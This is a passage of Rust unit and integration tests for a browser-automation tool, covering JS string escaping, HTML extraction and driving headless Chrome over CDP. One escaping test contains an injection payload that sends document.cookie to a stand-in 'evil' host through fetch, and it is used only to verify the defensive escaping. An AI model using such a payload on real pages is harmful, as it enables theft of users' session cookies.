    fn has_return_statement_ignores_callback_return() {
        assert!(!has_return_statement(
            "[1,2,3].map(function (x) { return x; }).length"
        ));
        assert!(!has_return_statement(
            "[1,2,3].forEach(function (x) { return; })"
        ));
        assert!(!has_return_statement(
            "JSON.stringify({ fn: function () { return 1; } })"
        ));
    }

    #[test]
    fn has_return_statement_ignores_string_and_comment_return() {
        assert!(!has_return_statement("JSON.stringify({ s: 'return 1' })"));
        assert!(!has_return_statement("// return 1\ndocument.title"));
        assert!(!has_return_statement("/* return 1 */\ndocument.title"));
    }

    #[test]
    fn has_return_statement_allows_top_level_return_after_block() {
        // The second `return` is top-level (depth 0); the first is inside the
        // block and is correctly ignored.
        assert!(has_return_statement("if (x) { return 1; } return 2;"));
    }

    #[test]
    fn extract_from_html_pulls_text_and_attrs() {
        let html =
            r#"<html><body><article class="post" id="a1"><h2>Title A</h2></article></body></html>"#;
        let out = extract_from_html(html, "article.post h2").unwrap();
        let items = out["items"].as_array().expect("items array");
        assert_eq!(items.len(), 1);
        assert_eq!(items[0]["text"], "Title A");
        assert_eq!(out["count"], 1);
        assert_eq!(out["truncated"], false);
    }

    #[test]
    fn extract_from_html_follows_descendant_anchor_href() {
        let html = r#"<ul><li data-id="7"><a href="/doc/7">Read</a></li></ul>"#;
        let out = extract_from_html(html, "li").unwrap();
        let item = &out["items"][0];
        assert_eq!(item["attrs"]["data-id"], "7");
        assert_eq!(item["href"], "/doc/7");
        assert_eq!(item["text"], "Read");
    }

    #[test]
    fn extract_from_html_prefers_own_href() {
        let html = r#"<a class="link" href="/self">link <a href="/child">nested</a></a>"#;
        let out = extract_from_html(html, "a.link").unwrap();
        assert_eq!(out["items"][0]["href"], "/self");
    }

    #[test]
    fn extract_from_html_invalid_selector_errors() {
        // A leading combinator (no left-hand compound) is invalid CSS.
        assert!(extract_from_html("<html></html>", "> div").is_err());
    }

    #[test]
    fn extract_from_html_truncates_over_max() {
        let html = format!(
            "<ul>{}</ul>",
            std::iter::repeat_n("<li>x</li>", 220).collect::<String>()
        );
        let out = extract_from_html(&html, "li").unwrap();
        assert_eq!(out["count"], 200);
        assert_eq!(out["truncated"], true);
    }

    #[test]
    fn browser_args_deserialization() {
        let json = r#"{"action":"goto","url":"https://example.com","wait_secs":5}"#;
        let args: BrowserArgs = serde_json::from_str(json).unwrap();
        assert!(matches!(args.action, BrowserAction::Goto));
        assert_eq!(args.url.as_deref(), Some("https://example.com"));
        assert_eq!(args.wait_secs, Some(5));
    }

    #[test]
    fn browser_args_defaults() {
        let json = r#"{"action":"status"}"#;
        let args: BrowserArgs = serde_json::from_str(json).unwrap();
        assert!(matches!(args.action, BrowserAction::Status));
        assert_eq!(args.url, None);
        assert!(args.clear, "clear should default to true");
    }

    #[test]
    fn browser_args_find_action() {
        let args: BrowserArgs = serde_json::from_str(r#"{"action":"find"}"#).unwrap();
        assert!(matches!(args.action, BrowserAction::Find));
    }

    // ── js_str escaping tests ──────────────────────────────────────────────

    #[test]
    fn js_str_escapes_double_quotes() {
        assert_eq!(js_str("say \"hi\""), "\"say \\\"hi\\\"\"");
    }

    #[test]
    fn js_str_escapes_backslash() {
        assert_eq!(js_str(r"C:\path"), "\"C:\\\\path\"");
    }

    #[test]
    fn js_str_escapes_newline() {
        assert_eq!(js_str("a\nb"), "\"a\\nb\"");
    }

    #[test]
    fn js_str_round_trips_injection_payload() {
        let malicious = r#"'); fetch('https://evil/?c='+document.cookie);//"#;
        let encoded = js_str(malicious);
        // Must be a single valid JSON string literal.
        let decoded: &str = serde_json::from_str(&encoded).unwrap();
        assert_eq!(decoded, malicious);
        // No unescaped single-quote followed by `)` (the old break-out vector).
        assert!(encoded.starts_with('"') && encoded.ends_with('"'));
    }

    #[test]
    fn js_str_normal_selector() {
        assert_eq!(js_str("#login-btn"), "\"#login-btn\"");
    }

    // ── CDP evaluate IIFE-wrapping tests ──────────────────────────────────
    // Verifies the has_return_statement predicate that decides IIFE wrapping.

    #[test]
    fn cdp_evaluate_no_wrap_for_bare_expression() {
        assert!(!has_return_statement("document.title"));
    }

    #[test]
    fn cdp_evaluate_wrap_for_top_level_return() {
        assert!(has_return_statement(
            "let items = document.querySelectorAll('li'); return items.length;"
        ));
    }

    #[test]
    fn cdp_evaluate_no_wrap_for_callback_return() {
        assert!(!has_return_statement("[1,2,3].map((x) => x * 2).length"));
    }

    // ── CDP integration tests ─────────────────────────────────────────────
    // Requires Chrome installed.

    #[tokio::test]
    async fn cdp_backend_full_lifecycle() {
        let chrome = find_chrome_binary()
            .expect("Chrome not found. Set CHROME_BIN=/path/to/chrome or install google-chrome.");

        // Pick a random available port.
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        drop(listener);

        // Spawn Chrome with CDP enabled.
        let mut chrome_proc = tokio::process::Command::new(&chrome)
            .arg("--headless")
            .arg(format!("--remote-debugging-port={port}"))
            .arg("--no-sandbox")
            .arg("--disable-gpu")
            .arg("--window-size=1280,720")
            .arg("about:blank")
            .stdin(std::process::Stdio::null())
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .spawn()
            .expect("Failed to spawn Chrome");

        // Wait for the CDP endpoint to be ready.
        let targets_url = format!("http://127.0.0.1:{port}/json");
        let mut ready = false;
        for _ in 0..50 {
            if reqwest::get(&targets_url)
                .await
                .map(|r| r.status().is_success())
                .unwrap_or(false)
            {
                ready = true;
                break;
            }
            tokio::time::sleep(Duration::from_millis(200)).await;
        }
        assert!(ready, "CDP endpoint not ready within 10s");

        // Connect via the registry's CDP entry point — this hits the
        // "attach to an already-running Chrome" fast path.
        let session = BrowserRegistry::connect_cdp(port, "/tmp/archon-cdp-attach-test")
            .await
            .expect("connect_cdp failed");

        // Navigate to a data URL (no network needed).
        let page = "data:text/html,<html><head><title>CDP Test Page</title></head><body><h1>Hello CDP</h1><p id='para'>Test paragraph text</p><button id='btn'>Click me</button><input id='inp' type='text' value='initial'></body></html>";
        session.goto(page).await.expect("goto failed");

        // title
        let title = session.title().await.expect("title failed");
        assert!(title.contains("CDP Test Page"), "title: {title}");

        // current_url
        let current = session.current_url().await.expect("current_url failed");
        assert!(current.starts_with("data:"), "url: {current}");

        // read_page_text
        let text = session
            .read_page_text()
            .await
            .expect("read_page_text failed");
        assert!(text.contains("Hello CDP"), "page text: {text}");
        assert!(text.contains("Test paragraph text"), "page text: {text}");

        // read_selector_text
        let para = session
            .read_selector_text("#para", Duration::from_secs(3))
            .await
            .expect("read_selector_text failed");
        assert_eq!(para.trim(), "Test paragraph text");

        // evaluate
        let val = session.evaluate("2 + 3").await.expect("evaluate failed");
        assert_eq!(val, serde_json::json!(5));

        // get_outer_html + extract_from_html
        let html = session
            .get_outer_html()
            .await
            .expect("get_outer_html failed");
        assert!(
            html.contains("Hello CDP"),
            "outerHTML should contain page content"
        );
        let extracted = extract_from_html(&html, "h1").expect("extract failed");
        assert_eq!(extracted["count"], 1);
        assert_eq!(extracted["items"][0]["text"], "Hello CDP");

        // list_interactive_elements (page has <button id='btn'> and <input id='inp'>)
        let elements = session
            .list_interactive_elements(10)
            .await
            .expect("list_interactive_elements failed");
        assert!(
            !elements.is_empty(),
            "page has <button> and <input>; should not be empty"
        );
        let inp = elements.iter().find(|e| e["id"] == "inp");
        assert!(inp.is_some(), "input#inp should be in the list");
        assert_eq!(inp.unwrap()["suggested_selector"], "#inp");
        let btn = elements.iter().find(|e| e["id"] == "btn");
        assert!(btn.is_some(), "button#btn should be in the list");
        assert_eq!(btn.unwrap()["tag"], "button");

        // type_text (clear + type)
        session
            .type_text("#inp", "hello world", true, Duration::from_secs(3))
            .await
            .expect("type_text failed");
        let inp_val = session
            .evaluate("document.querySelector('#inp').value")
            .await
            .expect("read input value failed");
        assert_eq!(inp_val, serde_json::json!("hello world"));

        // screenshot (viewport)
        let png = session
            .screenshot(None)
            .await
            .expect("screenshot failed");
        assert!(png.len() > 1000, "PNG too small: {} bytes", png.len());
        assert!(
            png.starts_with(&[0x89, 0x50, 0x4E, 0x47]),
            "screenshot is not a PNG"
        );

        // screenshot (element)
        let el_png = session
            .screenshot(Some("h1"))
            .await
            .expect("element screenshot failed");
        assert!(
            el_png.len() > 100,
            "element PNG too small: {} bytes",
            el_png.len()
        );

        // is_alive
        assert!(session.is_alive().await, "session should be alive");

        // label
        let label = session.label();
        assert!(
            label.contains("CDP"),
            "label should mention CDP, got: {label}"
        );

        // close (should NOT kill Chrome)
        session.close().await.expect("close failed");

        // Verify Chrome is still running (CDP close doesn't kill the browser).
        let still_up = reqwest::get(&targets_url)
            .await
            .map(|r| r.status().is_success())
            .unwrap_or(false);
        assert!(still_up, "Chrome should still be running after CDP close");

        // Cleanup: kill the spawned Chrome.
        chrome_proc.kill().await.ok();
        chrome_proc.wait().await.ok();
    }

    #[tokio::test]
    async fn cdp_connect_spawns_and_cleans_up_managed_chrome() {
        let _chrome = find_chrome_binary()
            .expect("Chrome not found. Set CHROME_BIN=/path/to/chrome or install google-chrome.");

        // Pick a free port that is NOT currently serving CDP.
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        drop(listener);

        let profile =
            std::env::temp_dir().join(format!("archon-cdp-spawn-test-{}", std::process::id()));

        // connect_cdp must spawn its own Chrome since nothing listens on this port.
        let session = BrowserRegistry::connect_cdp(port, &profile.to_string_lossy())
            .await
            .expect("connect_cdp failed (should have spawned a managed Chrome)");

        // The session reports a managed instance with its job id.
        let label = session.label();
        let job_id = label
            .rsplit_once("job ")
            .map(|(_, id)| id.trim_end_matches(')').trim_end().to_string())
            .unwrap_or_else(|| panic!("label should contain the managed job id, got: {label}"));

        let reg = ProcessRegistry::global();
        let job = reg
            .list()
            .await
            .into_iter()
            .find(|j| j.id == job_id)
            .expect("managed Chrome job should exist in the ProcessRegistry");
        assert!(!job.finished, "managed Chrome job should be running");
        assert_eq!(job.source, "browser", "job source should be the browser tool");

        // Basic sanity: we can drive the page.
        let val = session.evaluate("1 + 1").await.expect("evaluate failed");
        assert_eq!(val, serde_json::json!(2));

        // Close must stop the managed Chrome (unlike an attached session).
        session.close().await.expect("close failed");

        let job = reg
            .list()
            .await
            .into_iter()
            .find(|j| j.id == job_id)
            .expect("managed Chrome job should still be listed");
        assert!(
            job.finished,
            "managed Chrome job should be finished after close"
        );

        // The CDP endpoint should stop serving shortly after the kill.
        let mut gone = false;
        for _ in 0..20 {
            if !BrowserRegistry::cdp_reachable(port).await {
                gone = true;
                break;
            }
            tokio::time::sleep(Duration::from_millis(200)).await;
        }
        assert!(
            gone,
            "CDP endpoint should be down after closing the managed session"
        );

        // Best-effort cleanup of the throwaway profile.
        let _ = std::fs::remove_dir_all(&profile);
    }
}
